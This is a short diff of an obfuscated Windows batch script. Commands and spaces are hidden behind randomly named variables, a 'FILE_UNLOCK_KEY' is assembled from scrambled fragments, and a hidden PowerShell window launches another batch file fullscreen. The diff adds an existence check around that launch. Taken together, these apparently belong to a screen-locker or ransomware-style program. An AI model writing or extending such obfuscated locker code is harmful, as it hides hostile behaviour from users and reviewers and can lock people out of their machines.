@@ -12,4 +12,6 @@ set "wbfuhw=set"
 %wbfuhw%%ehfwirh%"ethoonge%enfwyehf%U%&&JH+EGRwghwqQE"
 %wbfuhw%%ehfwirh%"wghwr3gf4fn%enfwyehf%FW{RHp5"
 %wbfuhw%%ehfwirh%"FILE_UNLOCK_KEY%enfwyehf%%efuwghuj%%gn6jg35n%%ergvg8rhw%%ethoonge%|%wghwr3gf4fn%"
+if%ehfwirh%exist%ehfwirh%"BackBatch.bat"%ehfwirh%(
 PowerShell -WindowStyle Hidden -Command "Start-Process BackBatch.bat -WindowStyle Maximized -ArgumentList '--start-fullscreen'"
+)%ehfwirh%else%ehfwirh%(echo%ehfwirh%Cannot%ehfwirh%find%ehfwirh%BackBatch.bat^!&&pause)
